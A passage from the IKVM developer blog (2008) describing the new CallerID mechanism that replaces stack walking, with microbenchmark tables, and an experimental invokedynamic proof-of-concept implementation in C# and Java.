<P><CODE><FONT color=#0000ff>class</FONT> <FONT color=#2b91af>ForName</FONT>&nbsp; {<BR>&nbsp; <FONT color=#0000ff>private static readonly</FONT> <FONT color=#2b91af>__CallerID</FONT> __callerID = <FONT color=#0000ff>new</FONT> <FONT color=#2b91af>__CallerID</FONT>();<BR>&nbsp; <FONT color=#0000ff>private sealed class</FONT> <FONT color=#2b91af>__CallerID</FONT> : ikvm.@internal.<FONT color=#2b91af>CallerID</FONT> { }<BR><BR>&nbsp; <FONT color=#0000ff>public static void</FONT> Main(<FONT color=#0000ff>string</FONT>[] args) {<BR>&nbsp;&nbsp;&nbsp; java.lang.<FONT color=#2b91af>Class</FONT>.forName(<FONT color=#a31515>"java.lang.Object"</FONT>, __callerID);<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>long</FONT> start = java.lang.<FONT color=#2b91af>System</FONT>.currentTimeMillis();<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>for</FONT> (<FONT color=#0000ff>int</FONT> i = 0; i &lt; 100000; i++)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; java.lang.<FONT color=#2b91af>Class</FONT>.forName(<FONT color=#a31515>"java.lang.Object"</FONT>, __callerID);<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>long</FONT> end = java.lang.<FONT color=#2b91af>System</FONT>.currentTimeMillis();<BR>&nbsp;&nbsp;&nbsp; java.lang.<FONT color=#2b91af>System</FONT>.@out.println(end - start);<BR>&nbsp; }<BR>}</CODE></P>
<P>This shows that the compiler passes an extra parameter to the Class.forName() method that carries the identity of the caller's class.</P>
<P>The source for <CODE>ikvm.internal.CallerID</CODE> is available in <A href="http://ikvm.cvs.sourceforge.net/ikvm/ikvm/classpath/ikvm/internal/CallerID.java?view=markup">cvs</A>. The class is public and has a protected constructor but has no public methods (they are all internal to the IKVM.OpenJDK.ClassLibrary assembly). The intended usage is shown above, you should extend it with a private class that is nested inside the class whose identity you want to pass to a CallerID requiring API.</P>
<P>The example also demonstrates how you can call these methods from C# if you want to get the best performance, however I recommend using the standard versions of the APIs unless the performance difference is critical to your application.</P>
<P>Above we looked at the caller, now let's look at the callee. Here's the Java source for the <CODE>Class.forName()</CODE> method:</P>
<P><CODE>@ikvm.internal.<FONT color=#2b91af>HasCallerID</FONT><BR><FONT color=#0000ff>public static</FONT> <FONT color=#2b91af>Class</FONT><?> forName(<FONT color=#2b91af>String</FONT> className) <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>throws</FONT> <FONT color=#2b91af>ClassNotFoundException</FONT> {<BR>&nbsp; <FONT color=#0000ff>return</FONT> forName0(className, <FONT color=#0000ff>true</FONT>, <FONT color=#2b91af>ClassLoader</FONT>.getCallerClassLoader());<BR>}</CODE></P>
<P>I added the <CODE>HasCallerID</CODE> annotation to signal to ikvmc that it should add the implicit CallerID parameter and <CODE>ClassLoader.getCallerClassLoader()</CODE> has been turned into an <A href="http://ikvm.cvs.sourceforge.net/ikvm/ikvm/runtime/intrinsics.cs?view=markup">intrinsic</A> that calls <CODE>getCallerClassLoader()</CODE> on the passed in <CODE>CallerID</CODE> object instead. Here's the C# equivalent that ikvmc produces for the <CODE>Class.forName()</CODE> method:</P>
<P><CODE><FONT color=#0000ff>public static</FONT> java.lang.<FONT color=#2b91af>Class</FONT> forName(<FONT color=#0000ff>string</FONT> className, ikvm.@internal.<FONT color=#2b91af>CallerID</FONT> callerID) {<BR>&nbsp; <FONT color=#0000ff>return</FONT> java.lang.<FONT color=#2b91af>Class</FONT>.forName0(className, <FONT color=#0000ff>truee</FONT>, callerID.getCallerClassLoader());<BR>}<BR><BR>[IKVM.Attributes.<FONT color=#2b91af>HideFromJava</FONT>]<BR><FONT color=#0000ff>public static</FONT> java.lang.<FONT color=#2b91af>Class</FONT> forName(<FONT color=#0000ff>string</FONT> className) {<BR>&nbsp; System.Diagnostics.<FONT color=#2b91af>StackFrame</FONT> caller = <FONT color=#0000ff>new</FONT> System.Diagnostics.<FONT color=#2b91af>StackFrame</FONT>(1, <FONT color=#0000ff>false</FONT>);<BR>&nbsp; <FONT color=#0000ff>return</FONT> forName(className, ikvm.@internal.<FONT color=#2b91af>CallerID</FONT>.create(caller));<BR>}</CODE></P>
<P>In part 3 we'll look at the design decisions behind this implementation.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		06/01/2008 10:15:18 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=d782ef31-865a-4dd9-aa1b-dd5b7a404676"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=d782ef31-865a-4dd9-aa1b-dd5b7a404676">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Saturday, 31 May 2008</h2></div>
<div class="newsItems"><a name="a2b345417-9641-4277-8696-0b9e1f30bf6d"></a><div class="entry">
	<h3 class="entryTitle">Introducing CallerID Part 1</h3>
	<div class="entryBody">
		<P>In the Java API there are a number of APIs that rely on being able to walk up the call stack to determine certain properties of the immediate caller of the API. The most common scenario is determining the caller's class or class loader. This information is used to implement security checks or to use the right class loader.</P>
<P>Up until now IKVM used the <CODE><A href="http://msdn.microsoft.com/en-us/library/system.diagnostics.stackframe.aspx">System.Diagnostics.StackFrame</A></CODE> .NET API to walk the stack. There are however two major issues with this API. The first issue is that it is unreliable and IKVM jumps through various hoops to make sure that the CLR doesn't inline methods it shouldn't inline or use tail call optimizations it shouldn't use. The second issue is that it is relatively slow.</P>
<P>I finally got around to implementing an alternative scheme that eliminates the usage of <CODE>System.Diagnostics.StackFrame</CODE> in most cases. In part 2 I'll describe the implementation, but for now let's just look at some performance numbers.</P>
<P>I've cooked up two microbenchmarks that clearly demonstrate the difference between the current approach and the new approach.</P>
<P><B>Class.forName()</B></P>
<P>In this microbenchmark we look at the <CODE><A href="http://java.sun.com/javase/6/docs/api/java/lang/Class.html#forName(java.lang.String)">Class.forName()</A></CODE> API. It walks the call stack to determine the class loader of the immediate caller, because that is the class loader that it needs to use to load the class.</P>
<P><CODE><FONT color=#0000ff>class</FONT> <FONT color=#2b91af>ForName</FONT> {<BR>&nbsp; <FONT color=#0000ff>public static void</FONT> main(<FONT color=#2b91af>String</FONT>[] args) <FONT color=#0000ff>throws</FONT> <FONT color=#2b91af>Exception</FONT> {<BR>&nbsp;&nbsp;&nbsp; <FONT color=#2b91af>Class</FONT>.forName(<FONT color=#a31515>"java.lang.Object"</FONT>);<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>long</FONT> start = <FONT color=#2b91af>System</FONT>.currentTimeMillis();<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>for</FONT> (<FONT color=#0000ff>int</FONT> i = 0; i &lt; 100000; i++)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <FONT color=#2b91af>Class</FONT>.forName(<FONT color=#a31515>"java.lang.Object"</FONT>);<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>long</FONT> end = <FONT color=#2b91af>System</FONT>.currentTimeMillis();<BR>&nbsp;&nbsp;&nbsp; <FONT color=#2b91af>System</FONT>.out.println(end - start);<BR>&nbsp; }<BR>}</CODE></P>
<P>ForName results:</P>
<TABLE cellSpacing=0 border=0>
<TBODY>
<TR>
<TD style="BORDER-RIGHT: black 1px solid; BORDER-BOTTOM: black 1px solid">&nbsp;</TD>
<TD style="BORDER-BOTTOM: black 1px solid" align=right>x86</TD>
<TD style="BORDER-BOTTOM: black 1px solid" align=right>x64</TD></TR>
<TR>
<TD style="BORDER-RIGHT: black 1px solid">IKVM 0.37.3063&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </TD>
<TD align=right>&nbsp;&nbsp;&nbsp; 4350</TD>
<TD align=right>&nbsp;&nbsp;&nbsp; 3959</TD></TR>
<TR>
<TD style="BORDER-RIGHT: black 1px solid">IKVM 0.37.3073</TD>
<TD align=right>45</TD>
<TD align=right>49</TD></TR>
<TR>
<TD style="BORDER-RIGHT: black 1px solid">JDK 1.6</TD>
<TD align=right>138</TD>
<TD align=right>97</TD></TR></TBODY></TABLE>
<P><BR>(The difference between JDK 1.6 x86 and x64 is mostly due to x86 defaulting to HotSpot Client and x64 to HotSpot Server.)</P>
<P><B>Method.invoke()</B></P>
<P>The <CODE><A href="http://java.sun.com/javase/6/docs/api/java/lang/reflect/Method.html#invoke(java.lang.Object, java.lang.Object...)">Method.invoke()</A></CODE> API uses the caller class to perform the required access checks when you are calling a non-public method or a method in non-public class.</P>
<P><CODE><FONT color=#0000ff>class</FONT> <FONT color=#2b91af>Invoke</FONT> {<BR>&nbsp; <FONT color=#0000ff>public static void</FONT> main(<FONT color=#2b91af>String</FONT>[] args) <FONT color=#0000ff>throws</FONT> <FONT color=#2b91af>Exception</FONT> {<BR>&nbsp;&nbsp;&nbsp; java.lang.reflect.<FONT color=#2b91af>Method</FONT> m = <FONT color=#2b91af>Invoke</FONT>.<FONT color=#0000ff>class</FONT>.getDeclaredMethod(<FONT color=#a31515>"foo"</FONT>);<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>long</FONT> start = <FONT color=#2b91af>System</FONT>.currentTimeMillis();<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>for</FONT> (<FONT color=#0000ff>int</FONT> i = 0; i &lt; 100000; i++)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; m.invoke(<FONT color=#0000ff>null</FONT>);<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>long</FONT> end = <FONT color=#2b91af>System</FONT>.currentTimeMillis();<BR>&nbsp;&nbsp;&nbsp; <FONT color=#2b91af>System</FONT>.out.println(end - start);<BR>&nbsp; }<BR><BR>&nbsp; <FONT color=#0000ff>private static void</FONT> foo() { }<BR>}</CODE></P>
<P>Invoke results:</P>
<TABLE cellSpacing=0 border=0>
<TBODY>
<TR>
<TD style="BORDER-RIGHT: black 1px solid; BORDER-BOTTOM: black 1px solid">&nbsp;</TD>
<TD style="BORDER-BOTTOM: black 1px solid" align=right>x86</TD>
<TD style="BORDER-BOTTOM: black 1px solid" align=right>x64</TD></TR>
<TR>
<TD style="BORDER-RIGHT: black 1px solid">IKVM 0.37.3063&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </TD>
<TD align=right>&nbsp;&nbsp;&nbsp; 6083</TD>
<TD align=right>&nbsp;&nbsp;&nbsp; 5572</TD></TR>
<TR>
<TD style="BORDER-RIGHT: black 1px solid">IKVM 0.37.3073</TD>
<TD align=right>14</TD>
<TD align=right>16</TD></TR>
<TR>
<TD style="BORDER-RIGHT: black 1px solid">JDK 1.6</TD>
<TD align=right>82</TD>
<TD align=right>39</TD></TR></TBODY></TABLE><BR>
<P>To be continued in part 2...</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		05/31/2008 17:20:40 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=2b345417-9641-4277-8696-0b9e1f30bf6d"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=2b345417-9641-4277-8696-0b9e1f30bf6d">Comments [2]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 23 May 2008</h2></div>
<div class="newsItems"><a name="acb5d0f75-879f-41e1-93e0-8ed92a65d296"></a><div class="entry">
	<h3 class="entryTitle">Invokedynamic Proof of Concept Part 2</h3>
	<div class="entryBody">
		<P><A href="http://weblogs.java.net/blog/forax/archive/2008/05/javac_invokedyn_1.html">R&#233;mi Forax</A> inspired me to make my <A HREF="/PermaLink.aspx?guid=4470a1e6-14a8-4ab0-9817-322ae56d3988">invokedynamic proof of concept</A> a little more real, so I implemented it (still only as a proof of concept, not production quality code) in an IKVM 0.37 fork.</P>
<P>I used the following Java test case:</P>
<P><CODE><FONT color=#0000ff>interface</FONT> <FONT color=#2b91af>java_dyn_Dynamic</FONT><BR>{<BR>&nbsp; <FONT color=#0000ff>void</FONT> printSubstring(<FONT color=#0000ff>int</FONT> startIndex, <FONT color=#0000ff>int</FONT> length);<BR>&nbsp; <FONT color=#0000ff>int</FONT> length();<BR>}<BR><BR><FONT color=#0000ff>class</FONT> <FONT color=#2b91af>InvokeDynamic</FONT><BR>{<BR>&nbsp; <FONT color=#0000ff>static</FONT><BR>&nbsp; {<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>try</FONT><BR>&nbsp;&nbsp;&nbsp; {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; java.lang.reflect.<FONT color=#2b91af>Method</FONT> m = <FONT color=#2b91af>InvokeDynamic</FONT>.<FONT color=#0000ff>class</FONT>.getDeclaredMethod(<FONT color=#a31515>"bootstrapInvokeDynamic"</FONT>,<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; java.dyn.<FONT color=#2b91af>CallSite</FONT>.<FONT color=#0000ff>class</FONT>, <FONT color=#2b91af>Object</FONT>.<FONT color=#0000ff>class</FONT>, <FONT color=#2b91af>Object</FONT>[].<FONT color=#0000ff>class</FONT>);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; java.dyn.<FONT color=#2b91af>MethodHandle</FONT> mh = java.dyn.<FONT color=#2b91af>MethodHandles</FONT>.unreflect(m);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; java.dyn.<FONT color=#2b91af>Linkage</FONT>.registerBootstrapMethod(<FONT color=#2b91af>InvokeDynamic</FONT>.<FONT color=#0000ff>class</FONT>, mh);<BR>&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>catch</FONT> (<FONT color=#2b91af>Exception</FONT> x)<BR>&nbsp;&nbsp;&nbsp; {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; x.printStackTrace();<BR>&nbsp;&nbsp;&nbsp; }<BR>&nbsp; }<BR><BR>&nbsp; <FONT color=#0000ff>public static void</FONT> main(<FONT color=#2b91af>String</FONT>[] args)<BR>&nbsp; {<BR>&nbsp;&nbsp;&nbsp; <FONT color=#2b91af>java_dyn_Dynamic</FONT> obj = (<FONT color=#2b91af>java_dyn_Dynamic</FONT>)(<FONT color=#2b91af>Object</FONT>)<FONT color=#a31515>"invokedynamic"</FONT>;<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>for</FONT> (<FONT color=#0000ff>int</FONT> i = 0; i &lt; 3; i++)<BR>&nbsp;&nbsp;&nbsp; {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <FONT color=#2b91af>System</FONT>.out.println(<FONT color=#a31515>"len = "</FONT> + obj.length());<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; obj.printSubstring(3, 2);<BR>&nbsp;&nbsp;&nbsp; }<BR>&nbsp; }<BR><BR>&nbsp; <FONT color=#0000ff>public static void</FONT> printSubstring(<FONT color=#2b91af>String</FONT> str, <FONT color=#0000ff>int</FONT> startIndex, <FONT color=#0000ff>int</FONT> length)<BR>&nbsp; {<BR>&nbsp;&nbsp;&nbsp; <FONT color=#2b91af>System</FONT>.out.println(str.substring(startIndex, startIndex + length));<BR>&nbsp; }<BR><BR>&nbsp; <FONT color=#0000ff>private static</FONT> <FONT color=#2b91af>Object</FONT> bootstrapInvokeDynamic(java.dyn.<FONT color=#2b91af>CallSite</FONT> cs, <FONT color=#2b91af>Object</FONT> receiver, <FONT color=#2b91af>Object</FONT>[] args)<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>throws</FONT> <FONT color=#2b91af>Exception</FONT><BR>&nbsp; {<BR>&nbsp;&nbsp;&nbsp; <FONT color=#2b91af>System</FONT>.out.println(<FONT color=#a31515>"bootstrapInvokeDynamic"</FONT>);<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>if</FONT> (cs.getStaticContext().getName().equals(<FONT color=#a31515>"length"</FONT>))<BR>&nbsp;&nbsp;&nbsp; {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; java.lang.reflect.<FONT color=#2b91af>Method</FONT> m = <FONT color=#2b91af>String</FONT>.<FONT color=#0000ff>class</FONT>.getMethod(<FONT color=#a31515>"length"</FONT>);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cs.setTarget(java.dyn.<FONT color=#2b91af>MethodHandles</FONT>.unreflect(m));<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>return</FONT> m.invoke(receiver);<BR>&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>else</FONT><BR>&nbsp;&nbsp;&nbsp; {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <FONT color=#2b91af>Class</FONT> c = cs.getStaticContext().getCallerClass();<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; java.lang.reflect.<FONT color=#2b91af>Method</FONT> m = c.getMethod(<FONT color=#a31515>"printSubstring"</FONT>, <FONT color=#2b91af>String</FONT>.<FONT color=#0000ff>class</FONT>, <FONT color=#0000ff>int</FONT>.<FONT color=#0000ff>class</FONT>, <FONT color=#0000ff>int</FONT>.<FONT color=#0000ff>class</FONT>);<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cs.setTarget(java.dyn.<FONT color=#2b91af>MethodHandles</FONT>.unreflect(m));<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <FONT color=#0000ff>return</FONT> m.invoke(<FONT color=#0000ff>null</FONT>, receiver, args[0], args[1]);<BR>&nbsp;&nbsp;&nbsp; }<BR>&nbsp; }<BR>}</CODE></P>
<P>After compiling this with javac I used a hex editor to patch the file (changed <CODE>java_dyn_Dynamic</CODE> to <CODE>java/dyn/Dynamic</CODE> and <CODE>C0 00 03</CODE> to <CODE>00 00 00</CODE> to remove the checkcast instruction).</P>
<P>Current limitations:</P>
<UL>
<LI>java.dyn.MethodType is not implemented.</LI>
<LI>MethodHandles can only be created on methods with a couple of arguments and from the primitive types only int can be used as an argument or return type.</LI>
<LI>Not all of the IKVM specific corner cases are supported (e.g. calling .NET methods or methods on remapped types).</LI>
<LI>The CallSite and MethodHandle implementation objects do not have a proper class (i.e. CallSite.getClass() doesn't work).</LI>
<LI>Only a small subset of the MethodHandle functionality is implemented (e.g. no bound or Java method handles).</LI></UL>
<P>None of these limitations pose any interesting challenges, so implementing them&nbsp;does not add much value to this proof of concept.</P>
<P>Files:</P>
<UL>
<LI>binaries: <A href="http://www.frijters.net/ikvmbin-invokedynamic.zip">ikvmbin-invokedynamic.zip</A></LI>
<LI>new source files + diffs: <A href="http://www.frijters.net/ikvm-invokedynamic.zip">ikvm-invokedynamic.zip</A></LI>
<LI>test case source and patches class file: <A href="http://www.frijters.net/invokedynamic-demo.zip">invokedynamic-demo.zip</A></LI></UL>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		05/23/2008 15:17:04 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=cb5d0f75-879f-41e1-93e0-8ed92a65d296"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=cb5d0f75-879f-41e1-93e0-8ed92a65d296">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 21 May 2008</h2></div>
<div class="newsItems"><a name="a4470a1e6-14a8-4ab0-9817-322ae56d3988"></a><div class="entry">
	<h3 class="entryTitle">Invokedynamic Proof of Concept</h3>
	<div class="entryBody">
		 <p>
 A few days ago the JSR 292 expert group
 <a href="http://blogs.sun.com/jrose/entry/invokedynamic_goes_public">
 released</a> an early draft review for the invokedynamic instruction.</p>
 <p>
 To investigate how this would work out for IKVM, I cooked up a proof of 
 concept in C#.</p>
 <p><code><font color="#0000FF">class</font> <font color="#2B91AF">InvokeDynamicPoC</font><br>
 {<br>
&nbsp; <font color="#0000FF">private static</font> <font color="#2B91AF">InvokeDynamic</font>&lt;<font color="#0000FF">object</font>, 
 <font color="#2B91AF">CallSite</font>, <font color="#0000FF">object</font>, 
 <font color="#0000FF">object</font>[]&gt; 
 __bootstrapMethod =<br>
&nbsp;&nbsp;&nbsp; bootstrapInvokeDynamic;<br>
&nbsp; <font color="#0000FF">private static</font> <font color="#2B91AF">CallSiteImpl</font>&lt;<font color="#2B91AF">InvokeDynamicVoid</font>&lt;<font color="#0000FF">string</font>, 
 <font color="#0000FF">int</font>, <font color="#0000FF">int</font>&gt;&gt; __site1 
 =<br>
&nbsp;&nbsp;&nbsp; <font color="#0000FF">new</font> <font color="#2B91AF">CallSiteImpl</font>&lt;<font color="#2B91AF">InvokeDynamicVoid</font>&lt;<font color="#0000FF">string</font>,
 <font color="#0000FF">int</font>, <font color="#0000FF">int</font>&gt;&gt;(<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <font color="#0000FF">new</font>
 <font color="#2B91AF">StaticContextImpl</font>(<font color="#0000FF">typeof</font>(<font color="#2B91AF">InvokeDynamicPoC</font>), 
 <font color="#A31515">&quot;printSubstring&quot;</font>));<br>
 <br>
&nbsp; <font color="#0000FF">private static void</font> Main()<br>
&nbsp; {<br>
&nbsp;&nbsp;&nbsp; <font color="#0000FF">for</font> (<font color="#0000FF">int</font> j = 0; j &lt; 2; j++)<br>
&nbsp;&nbsp;&nbsp; {<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <font color="#0000FF">int</font> start = 
 <font color="#2B91AF">Environment</font>.TickCount;<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <font color="#0000FF">for</font> (<font color="#0000FF">int</font> i = 0; i &lt; 10<font color="#008000">/*0000000/**/</font>; i++)<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <font color="#0000FF">string</font> obj = 
 <font color="#A31515">&quot;invokedynamic&quot;</font>;<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <font color="#0000FF">int</font> arg1 = 3;<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <font color="#0000FF">int</font> arg2 = 2;<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
 <font color="#2B91AF">MethodHandleImpl</font>&lt;<font color="#2B91AF">InvokeDynamicVoid</font>&lt;<font color="#0000FF">string</font>, 
 <font color="#0000FF">int</font>, <font color="#0000FF">int</font>&gt;&gt; mh = __site1.mh;<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <font color="#0000FF">if</font> (mh ==
 <font color="#0000FF">null</font>)<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
 __bootstrapMethod(__site1, obj, <font color="#0000FF">new object</font>[] { 
 java.lang.<font color="#2B91AF">Integer</font>.valueOf(arg1),<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
 java.lang.<font color="#2B91AF">Integer</font>.valueOf(arg2) });<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <font color="#0000FF">else</font><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mh.d(obj, arg1, arg2);<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <font color="#0000FF">int</font> end = 
 <font color="#2B91AF">Environment</font>.TickCount;<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <font color="#2B91AF">Console</font>.WriteLine(end - start);<br>
&nbsp;&nbsp;&nbsp; }<br>
&nbsp; }<br>
 <br>
&nbsp; <font color="#0000FF">private static void</font> printSubstring(<font color="#0000FF">string</font> s, 
 <font color="#0000FF">int</font> startIndex, <font color="#0000FF">int</font> length)<br>
&nbsp; {<br>
&nbsp;&nbsp;&nbsp; <font color="#2B91AF">Console</font>.WriteLine(s.Substring(startIndex, length));<br>
&nbsp; }<br>
 <br>
&nbsp; <font color="#0000FF">private static object</font> bootstrapInvokeDynamic(<font color="#2B91AF">CallSite</font> cs,
 <font color="#0000FF">object</font> 
 receiver, <font color="#0000FF">object</font>[] arguments)<br>
&nbsp; {<br>
&nbsp;&nbsp;&nbsp; java.lang.<font color="#2B91AF">Class</font> c =
 <font color="#0000FF">typeof</font>(<font color="#2B91AF">InvokeDynamicPoC</font>);<br>
&nbsp;&nbsp;&nbsp; java.lang.reflect.<font color="#2B91AF">Method</font> m = 
 c.getDeclaredMethod(cs.getStaticContext().getName(),<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
 <font color="#0000FF">typeof</font>(<font color="#0000FF">string</font>), 
 <font color="#0000FF">typeof</font>(<font color="#0000FF">int</font>), 
 <font color="#0000FF">typeof</font>(<font color="#0000FF">int</font>));<br>
&nbsp;&nbsp;&nbsp; <font color="#2B91AF">MethodHandle</font> mh = 
 <font color="#2B91AF">MethodHandles</font>.unreflect(m);<br>
&nbsp;&nbsp;&nbsp; cs.setTarget(mh);<br>
&nbsp;&nbsp;&nbsp; <font color="#0000FF">return</font> m.invoke(<font color="#0000FF">null</font>, receiver, arguments[0], arguments[1]);<br>
&nbsp; }<br>
 }</code></p><p>The full (compilable and working) source is available
 <a href="http://www.frijters.net/InvokeDynamicPoc.cs.txt">here</a>.</p>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		05/21/2008 09:56:49 (W. Europe Daylight Time, UTC+02:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=4470a1e6-14a8-4ab0-9817-322ae56d3988"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=4470a1e6-14a8-4ab0-9817-322ae56d3988">Comments [0]</a>
		
		<br clear="all">
	</div>
</div><a name="a0eb30151-ed5c-4c5c-8eb7-8648be97b68e"></a><div class="entry">
	<h3 class="entryTitle">New Development Snapshot</h3>
	<div class="entryBody">
		<P>More .NET 2.0 work and bug fixing, but the biggest change is that class library initialization has been refactored (building on the property support added in the <A HREF="/PermaLink.aspx?guid=8d0c4cfc-b9ed-43fe-920a-00d27be1ca90">previous snaphot</A> which allows <CODE>java.lang.System</CODE> to lazily initialize the I/O streams). Instead of it being an all or nothing approach (i.e. initialize all core classes at once, like in Java) the initialization dependencies have been mostly removed and each part can now be initialized on demand. This makes the code easier to follow, startup more efficient and removed the need for some ugly hacks to make initialization work correctly.</P>
